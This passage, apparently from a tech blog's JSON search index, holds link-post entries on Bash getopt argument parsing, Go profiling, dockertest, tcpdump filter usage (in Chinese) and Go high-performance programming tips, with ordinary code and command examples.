tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eVALID_ARGS\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003egetopt -o abg:d: --long alpha,beta,gamma:,delta: -- \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$@\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[[\u003c/span\u003e $? -ne \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e]]\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    exit 1;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eeval set -- \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$VALID_ARGS\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e : \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ecase\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e in\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    -a | --alpha\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing \u0026#39;alpha\u0026#39; option\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        shift\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    -b | --beta\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing \u0026#39;beta\u0026#39; option\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        shift\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    -g | --gamma\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing \u0026#39;gamma\u0026#39; option. Input argument is \u0026#39;\u003c/span\u003e$2\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        shift \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    -d | --delta\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing \u0026#39;delta\u0026#39; option. Input argument is \u0026#39;\u003c/span\u003e$2\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        shift \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    --\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e shift;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        break\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eesac\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e-o\u003c/code\u003e option represents the short command-line options\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e--long\u003c/code\u003e option represents the long command-line options\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Linux","BASH"],"title":"Parse Command Line Arguments in Bash"},{"categories":["URL","Go"],"contents":" Go code refactoring : the 23x performance hunt $ go test -bench=. -cpuprofile cpu.prof $ go tool pprof -svg cpu.prof \u0026gt; cpu.svg $ go test -bench=. -trace trace.out $ go tool trace trace.out ","date":"June 7, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220607-go-code-refactoring-the-23x-performance-hunt/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/@val_deleplace/go-code-refactoring-the-23x-performance-hunt-156746b522f7\" target=\"_blank\" rel=\"noopener\"\u003eGo code refactoring : the 23x performance hunt\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go test -bench\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e. -cpuprofile cpu.prof\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go tool pprof -svg cpu.prof \u0026gt; cpu.svg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go test -bench\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e. -trace trace.out\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go tool trace trace.out\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go"],"title":"Go code refactoring : the 23x performance hunt"},{"categories":["URL","Go","Testing"],"contents":" Dockertest 极速搭建集成测试环境神器 dockertest ","date":"May 12, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220512-dockertest/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://cn-sec.com/archives/998286.html\" target=\"_blank\" rel=\"noopener\"\u003eDockertest 极速搭建集成测试环境神器\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/ory/dockertest\" target=\"_blank\" rel=\"noopener\"\u003edockertest\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Go","Testing"],"title":"Dockertest 极速搭建集成测试环境神器"},{"categories":["URL","Network","tcpdump","command line"],"contents":" Tcpdump 使用总结 命令使用 tcpdump 采用命令行方式，它的命令格式为：\ntcpdump [ -AdDeflLnNOpqRStuUvxX ] [ -c count ] [ -C file_size ] [ -F file ] [ -i interface ] [ -m module ] [ -M secret ] [ -r file ] [ -s snaplen ] [ -T type ] [ -w file ] [ -W filecount ] [ -E spi@ipaddr algo:secret, ... ] [ -y datalinktype ] [ -Z user ] [ expression ] tcpdump 的简单选项介绍 -E spi@ipaddr algo:secret , ...，可通过spi@ipaddr algo:secret 来解密 IPsec ESP 包。secret 为用于 ESP 的密钥，使用 ASCII 字符串方式表达。 如果以 0x 开头，该密钥将以 16 进制方式读入。 除了以上的语法格式(指spi@ipaddr algo:secret)， 还可以在后面添加一个语法输入文件名字供 tcpdump 使用(即把 spi@ipaddr algo:secret, … 中…换成一个语法文件名)。 在接收到第一个 ESP 包时会打开此文件， 所以最好此时把赋予 tcpdump 的一些特权取消(可理解为，这样防范之后，当该文件为恶意编写时，不至于造成过大损害)。 -T type 强制 tcpdump 按 type 指定的协议所描述的包结构来分析收到的数据包。 目前已知的 type 可取的协议为: aodv (Ad-hoc On-demand Distance Vector protocol， 按需距离向量路由协议，在 Ad hoc(点对点模式)网络中使用)， cnfp (Cisco NetFlow protocol) rpc(Remote Procedure Call) rtp (Real-Time Applications protocol) rtcp (Real-Time Applications con-trol protocol) snmp (Simple Network Management Protocol) tftp (Trivial File Transfer Protocol， 碎文件协议) vat (Visual Audio Tool， 可用于在 internet 上进行电视电话会议的应用层协议) wb (distributed White Board， 可用于网络会议的应用层协议) 实用命令实例 截获主机 210.27.48.1 和主机 210.27.48.2 或 210.27.48.3 的通信\ntcpdump host 210.27.48.1 and \\( 210.27.48.2 or 210.27.48.3 \\) 监视所有送到主机 hostname 的数据包\ntcpdump -i eth0 dst host hostname 获取主机 210.27.48.1 接收或发出的 telnet 包\ntcpdump tcp port 23 and host 210.27.48.1 打印 TCP 会话中的的开始和结束数据包, 并且数据包的源或目的不是本地网络上的主机.(nt: localnet, 实际使用时要真正替换成本地网络的名字)\ntcpdump 'tcp[tcpflags] \u0026amp; (tcp-syn|tcp-fin) != 0 and not src and dst net localnet' 打印所有源或目的端口是 80, 网络层协议为 IPv4, 并且含有数据,而不是 SYN,FIN 以及 ACK-only 等不含数据的数据包\ntcpdump 'tcp port 80 and (((ip[2:2] - ((ip[0]\u0026amp;0xf)\u0026lt;\u0026lt;2)) - ((tcp[12]\u0026amp;0xf0)\u0026gt;\u0026gt;2)) != 0)' (可理解为, ip[2:2]表示整个 ip 数据包的长度, (ip[0]\u0026amp;0xf)«2)表示 ip 数据包包头的长度(ip[0]\u0026amp;0xf 代表包中的 IHL 域, 而此域的单位为 32bit, 要换算成字节数需要乘以 4,　即左移 2.　(tcp[12]\u0026amp;0xf0)»4 表示 tcp 头的长度, 此域的单位也是 32bit,　换算成比特数为 ((tcp[12]\u0026amp;0xf0) » 4)　«　２,　即 ((tcp[12]\u0026amp;0xf0)»2).　((ip[2:2] - ((ip[0]\u0026amp;0xf)«2)) - ((tcp[12]\u0026amp;0xf0)»2)) != 0 表示:整个 ip 数据包的长度减去 ip 头的长度,再减去 tcp 头的长度不为 0, 这就意味着,ip 数据包中确实是有数据.对于 ipv6 版本只需考虑 ipv6 头中的\u0026rsquo;Payload Length\u0026rsquo; 与 \u0026rsquo;tcp 头的长度\u0026rsquo;的差值, 并且其中表达方式\u0026rsquo;ip[]\u0026lsquo;需换成\u0026rsquo;ip6[]\u0026rsquo;.)\n抓取 HTTP 包\ntcpdump -XvvennSs 0 -i eth0 tcp[20:2]=0x4745 or tcp[20:2]=0x4854 0x4745 为\u0026quot;GET\u0026quot;前两个字母\u0026quot;GE\u0026quot;,0x4854 为\u0026quot;HTTP\u0026quot;前两个字母\u0026quot;HT\u0026quot;。\n","date":"May 5, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220505-tcpdump/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://markrepo.github.io/commands/2018/06/23/tcpdump/\" target=\"_blank\" rel=\"noopener\"\u003eTcpdump 使用总结\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"命令使用\"\u003e命令使用\u003c/h2\u003e\n\u003cp\u003etcpdump 采用命令行方式，它的命令格式为：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etcpdump \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -AdDeflLnNOpqRStuUvxX \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -c count \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -C file_size \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -F file \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -i interface \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -m module \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -M secret \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -r file \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -s snaplen \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -T type \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -w file \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -W filecount \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -E spi@ipaddr algo:secret, ...  \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -y datalinktype \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -Z user \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e expression \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"tcpdump-的简单选项介绍\"\u003etcpdump 的简单选项介绍\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e-E spi@ipaddr algo:secret , ...\u003c/code\u003e，可通过\u003ccode\u003espi@ipaddr algo:secret\u003c/code\u003e 来解密 IPsec ESP 包。secret 为用于 ESP 的密钥，使用 ASCII 字符串方式表达。 如果以 \u003ccode\u003e0x\u003c/code\u003e 开头，该密钥将以 16 进制方式读入。 除了以上的语法格式(指\u003ccode\u003espi@ipaddr algo:secret\u003c/code\u003e)， 还可以在后面添加一个语法输入文件名字供 tcpdump 使用(即把 spi@ipaddr algo:secret, … 中…换成一个语法文件名)。 在接收到第一个 ESP 包时会打开此文件， 所以最好此时把赋予 tcpdump 的一些特权取消(可理解为，这样防范之后，当该文件为恶意编写时，不至于造成过大损害)。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-T type\u003c/code\u003e 强制 tcpdump 按 type 指定的协议所描述的包结构来分析收到的数据包。 目前已知的 type 可取的协议为:\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eaodv\u003c/code\u003e (Ad-hoc On-demand Distance Vector protocol， 按需距离向量路由协议，在 Ad hoc(点对点模式)网络中使用)，\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ecnfp\u003c/code\u003e (Cisco NetFlow protocol)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003erpc\u003c/code\u003e(Remote Procedure Call)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ertp\u003c/code\u003e (Real-Time Applications protocol)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ertcp\u003c/code\u003e (Real-Time Applications con-trol protocol)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esnmp\u003c/code\u003e (Simple Network Management Protocol)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003etftp\u003c/code\u003e (Trivial File Transfer Protocol， 碎文件协议)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003evat\u003c/code\u003e (Visual Audio Tool， 可用于在 internet 上进行电视电话会议的应用层协议)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ewb\u003c/code\u003e (distributed White Board， 可用于网络会议的应用层协议)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"实用命令实例\"\u003e实用命令实例\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e截获主机 210.27.48.1 和主机 210.27.48.2 或 210.27.48.3 的通信\u003c/strong\u003e\u003c/p\u003e","tags":["URL","Network","tcpdump","command line"],"title":"Tcpdump 使用总结"},{"categories":["URL","Go"],"contents":" Go 语言高性能编程手册（万字长文） 常用数据结构 反射虽好，切莫贪杯\n优先使用 strconv 而不是 fmt 少量的重复不比反射差 慎用 binary.Read 和 binary.Write binary.Read 和 binary.Write 使用反射并且很慢。如果有需要用到这两个函数的地方，我们应该手动实现这两个函数的相关功能，而不是直接去使用它们。 避免重复的字符串到字节切片的转换\n指定容器(slice/map)容量\n字符串拼接方式\n行内拼接字符串推荐使用运算符 + 非行内拼接字符串推荐使用 strings.Builder 遍历 []struct{} 使用下标而不是 range\n两种通过 index 遍历 []struct 性能没有差别，但是 range 遍历 []struct 中元素时，性能非常差。\nrange 遍历 []*struct 中元素时，與下标性能没有差别。\n内存管理 使用空结构体节省内存\nstruct 布局要考虑内存对齐\nCPU 访问内存时，并不是逐个字节访问，而是以字长（word size）为单位访问。比如 32 位的 CPU ，字长为 4 字节，那么 CPU 访问内存的单位也是 4 字节。 这么设计的目的，是减少 CPU 访问内存的次数，加大 CPU 访问内存的吞吐量。比如同样读取 8 个字节的数据，一次读取 4 个字节那么只需要读取 2 次。\n减少逃逸，将变量限制在栈上\n变量逃逸一般发生在如下几种情况： 变量较大 变量大小不确定 变量类型不确定 返回指针 返回引用 闭包 小的拷贝好过引用 一般是 \u0026lt;64KB，局部变量将不会逃逸到堆上。 返回值 VS 返回指针 值传递会拷贝整个对象，而指针传递只会拷贝地址，指向的对象是同一个。返回指针可以减少值的拷贝，但是会导致内存分配逃逸到堆中，增加垃圾回收（GC）的负担。在对象频繁创建和删除的场景下，传递指针导致的 GC 开销可能会严重影响性能。 一般情况下，对于需要修改原对象值，或占用内存比较大的结构体，选择返回指针。对于只读的占用内存较小的结构体，直接返回值能够获得更好的性能。 返回值使用确定的类型 如果变量类型不确定，那么将会逃逸到堆上。所以，函数返回值如果能确定的类型，就不要使用 interface{}。 sync.Pool 复用对象\nsync.Pool 是可伸缩的，同时也是并发安全的，其容量仅受限于内存的大小。存放在池中的对象如果不活跃了会被自动清理。\n对于很多需要重复分配、回收内存的地方，sync.Pool 是一个很好的选择。频繁地分配、回收内存会给 GC 带来一定的负担，严重的时候会引起 CPU 的毛刺，而 sync.Pool 可以将暂时不用的对象缓存起来，待下次需要的时候直接使用，不用再次经过内存分配，复用对象的内存，减轻 GC 的压力，提升系统的性能。\n一句话总结：用来保存和复用临时对象，减少内存分配，降低 GC 压力。\n并发编程 关于锁\n无锁化 并非所有的并发都需要加锁。适当地降低锁的粒度，甚至采用无锁化的设计，更能提升并发能力。 无锁数据结构 利用硬件支持的原子操作可以实现无锁的数据结构，原子操作可以在 lock-free 的情况下保证并发安全，并且它的性能也能做到随 CPU 个数的增多而线性扩展。很多语言都提供 CAS 原子操作（如 Go 中的 atomic 包和 C++11 中的 atomic 库），可以用于实现无锁数据结构，如无锁链表。 串行无锁 串行无锁是一种思想，就是避免对共享资源的并发访问，改为每个并发操作访问自己独占的资源，达到串行访问资源的效果，来避免使用锁。不同的场景有不同的实现方式。比如网络 I/O 场景下将单 Reactor 多线程模型改为主从 Reactor 多线程模型，避免对同一个消息队列锁读取。 减少锁竞争 如果加锁无法避免，则可以采用分片的形式，减少对资源加锁的次数，这样也可以提高整体的性能。 比如 Golang 优秀的本地缓存组件 bigcache、go-cache、freecache 都实现了分片功能，每个分片一把锁，采用分片存储的方式减少加锁的次数从而提高整体性能。 优先使用共享锁而非互斥锁 所谓互斥锁，指锁只能被一个 Goroutine 获得。共享锁指可以同时被多个 Goroutine 获得的锁。 Go 标准库 sync 提供了两种锁，互斥锁（sync.Mutex）和读写锁（sync.RWMutex），读写锁便是共享锁的一种具体实现。 限制协程数量\n每个协程至少需要消耗 2KB 的空间，那么假设计算机的内存是 4GB，那么至多允许 4GB/2KB = 1M 个协程同时存在。\n协程池化 Jeffail/tunny / panjf2000/ants 使用 sync.Once 避免重复执行\n使用 sync.Cond 通知协程\nsync.Cond 是基于互斥锁/读写锁实现的条件变量，用来协调想要访问共享资源的那些 Goroutine，当共享资源的状态发生变化的时候，sync.Cond 可以用来通知等待条件发生而阻塞的 Goroutine。\n我们实现一个简单的例子，三个协程调用 Wait() 等待，另一个协程调用 Broadcast() 唤醒所有等待的协程。\ndone 即多个 Goroutine 阻塞等待的条件。 read() 调用 Wait() 等待通知，直到 done 为 true。 write() 接收数据，接收完成后，将 done 置为 true，调用 Broadcast() 通知所有等待的协程。 write() 中的暂停了 1s，一方面是模拟耗时，另一方面是确保前面的 3 个 read 协程都执行到 Wait()，处于等待状态。main 函数最后暂停了 3s，确保所有操作执行完毕。 var done = false func read(name string, c *sync.Cond) { c.L.Lock() for !done { c.Wait() } log.Println(name, \u0026#34;starts reading\u0026#34;) c.L.Unlock() } func write(name string, c *sync.Cond) { log.Println(name, \u0026#34;starts writing\u0026#34;) time.Sleep(time.Second) done = true log.Println(name, \u0026#34;wakes all\u0026#34;) c.Broadcast() } func main() { cond := sync.NewCond(\u0026amp;sync.Mutex{}) go read(\u0026#34;reader1\u0026#34;, cond) go read(\u0026#34;reader2\u0026#34;, cond) go read(\u0026#34;reader3\u0026#34;, cond) write(\u0026#34;writer\u0026#34;, cond) time.Sleep(time.Second * 3) } $ go run main.go 2022/03/07 17:20:09 writer starts writing 2022/03/07 17:20:10 writer wakes all 2022/03/07 17:20:10 reader3 starts reading 2022/03/07 17:20:10 reader1 starts reading 2022/03/07 17:20:10 reader2 starts reading sync.Cond 不能被复制 sync.Cond 不能被复制的原因，并不是因为其内部嵌套了 Locker。因为 NewCond 时传入的 Mutex/RWMutex 指针，对于 Mutex 指针复制是没有问题的。 主要原因是 sync.Cond 内部是维护着一个 Goroutine 通知队列 notifyList。如果这个队列被复制的话，那么就在并发场景下导致不同 Goroutine 之间操作的 notifyList.wait、notifyList.notify 并不是同一个，这会导致出现有些 Goroutine 会一直阻塞。 从等待队列中按照顺序唤醒，先进入等待队列，先被唤醒。 调用 Wait() 前要加锁 调用 Wait() 函数前，需要先获得条件变量的成员锁，原因是需要互斥地变更条件变量的等待队列。在 Wait() 返回前，会重新上锁。 ","date":"April 22, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220422-go-high-performance-programming-manual/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://mp.weixin.qq.com/s/iSxWFsnNLGgilzKIsSDBgg\" target=\"_blank\" rel=\"noopener\"\u003eGo 语言高性能编程手册（万字长文）\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"常用数据结构\"\u003e常用数据结构\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003e反射虽好，切莫贪杯\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e优先使用 \u003ccode\u003estrconv\u003c/code\u003e 而不是 \u003ccode\u003efmt\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e少量的重复不比反射差\u003c/li\u003e\n\u003cli\u003e慎用 \u003ccode\u003ebinary.Read\u003c/code\u003e 和 \u003ccode\u003ebinary.Write\u003c/code\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ebinary.Read\u003c/code\u003e 和 \u003ccode\u003ebinary.Write\u003c/code\u003e 使用反射并且很慢。如果有需要用到这两个函数的地方，我们应该手动实现这两个函数的相关功能，而不是直接去使用它们。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e避免重复的字符串到字节切片的转换\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e指定容器(slice/map)容量\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e字符串拼接方式\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e行内拼接字符串推荐使用运算符 \u003ccode\u003e+\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e非行内拼接字符串推荐使用 \u003ccode\u003estrings.Builder\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e遍历 \u003ccode\u003e[]struct{}\u003c/code\u003e 使用下标而不是 \u003ccode\u003erange\u003c/code\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e两种通过 index 遍历 \u003ccode\u003e[]struct\u003c/code\u003e 性能没有差别，但是 \u003ccode\u003erange\u003c/code\u003e 遍历 \u003ccode\u003e[]struct\u003c/code\u003e 中元素时，性能非常差。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003erange\u003c/code\u003e 遍历 \u003ccode\u003e[]*struct\u003c/code\u003e 中元素时，與下标性能没有差别。\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch4 id=\"内存管理\"\u003e内存管理\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003e使用空结构体节省内存\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003estruct 布局要考虑内存对齐\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eCPU 访问内存时，并不是逐个字节访问，而是以字长（word size）为单位访问。比如 32 位的 CPU ，字长为 4 字节，那么 CPU 访问内存的单位也是 4 字节。\n这么设计的目的，是减少 CPU 访问内存的次数，加大 CPU 访问内存的吞吐量。比如同样读取 8 个字节的数据，一次读取 4 个字节那么只需要读取 2 